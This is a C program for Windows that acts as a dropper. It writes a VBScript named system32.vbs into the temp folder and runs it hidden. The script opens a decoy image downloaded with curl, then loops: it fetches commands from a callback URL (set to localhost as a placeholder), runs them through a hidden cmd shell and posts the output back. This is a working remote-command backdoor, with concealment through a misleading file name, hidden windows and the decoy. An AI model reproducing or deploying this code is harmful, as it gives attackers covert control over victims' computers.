#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

void write_script(char path[]) {
	
	FILE *fptr;
	
	char s2[] = "On Error Resume Next\n\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nDim tmpFolder \ntmpFolder = fso.GetSpecialFolder(2)\nCONST callbackUrl = \"http://localhost:80/\"\nSet oS = CreateObject (\"WScript.Shell\")\noS.run \"cmd.exe /C curl \"\"https://m.media-amazon.com/images/I/71aNYIIU8gL.%%20UC256,256%%20CACC,256,256%%20.jpg\"\" -o \" & tmpFolder & \"\\tmp.jpg & start \"\" \"\" \" & tmpFolder & \"\\tmp.jpg & timeout 3\", 0, True\nDim xmlHttpReq, s, execObj, abc, break, re\n\nSet s = CreateObject(\"WScript.Shell\")\n\n\n\nbreak = False\nWhile break <> True\n    Set xmlHttpReq = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\")\n    xmlHttpReq.Open \"GET\", callbackUrl, false\n	xmlHttpReq.SetTimeouts 10000, 10000, 10000, 100000\n    xmlHttpReq.Send\n\n    abc = \"cmd /c \" & Trim(xmlHttpReq.responseText) & \" > \" &  tmpFolder & \"\\out.txt\" \n\n    If InStr(abc, \"EXIT\") Then\n        break = True\n    Else\n        With CreateObject(\"WScript.Shell\")\n\n			' Pass 0 as the second parameter to hide the window...\n			.Run abc, 0, True\n\n		End With\n		\n		re = \"\"\n		\n		With CreateObject(\"Scripting.FileSystemObject\")\n			\n			re = .OpenTextFile(tmpFolder & \"\\out.txt\").ReadAll()\n			.DeleteFile tmpFolder & \"\\out.txt\"\n\n		End With\n\n        Set xmlHttpReq = WScript.CreateObject(\"MSXML2.ServerXMLHTTP\")\n        xmlHttpReq.Open \"POST\", callbackUrl, false\n		xmlHttpReq.SetTimeouts 10000, 10000, 10000, 10000\n        xmlHttpReq.Send(re)\n    End If\nWend";

	// Open a file in writing mode
	fptr = fopen(path, "w");

	// Write some text to the file
	fprintf(fptr, s2);

	// Close the file
	fclose(fptr);
}

void execute(char path[]) {
STARTUPINFO si;
PROCESS_INFORMATION pi;

ZeroMemory( &si, sizeof(si) );
si.cb = sizeof(si);
ZeroMemory( &pi, sizeof(pi) );

char cmd[256] = "cscript //nologo ";
strcat(cmd, path);


if( !CreateProcess( NULL,   // No module name (use command line)
        cmd,        // Command line
        NULL,           // Process handle not inheritable
        NULL,           // Thread handle not inheritable
        FALSE,          // Set handle inheritance to FALSE
        CREATE_NO_WINDOW,              // No creation flags
        NULL,           // Use parent's environment block
        NULL,           // Use parent's starting directory 
        &si,            // Pointer to STARTUPINFO structure
        &pi )           // Pointer to PROCESS_INFORMATION structure
    ) 
    {
        printf( "CreateProcess failed (%d).\n", GetLastError() );
        return;
    }

/* Do work with handles */
WaitForSingleObject( pi.hProcess, INFINITE );
printf("waited");
// Close process handles and clean up
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}

int main(int argc, char *argv[]) {
	printf("start");
	const char* s = getenv("TEMP");
	char path[256];
	strcpy(path, s);
	strcat(path,"\\system32.vbs");
	printf(path);
    write_script(path);
	execute(path);
    return 0;
}

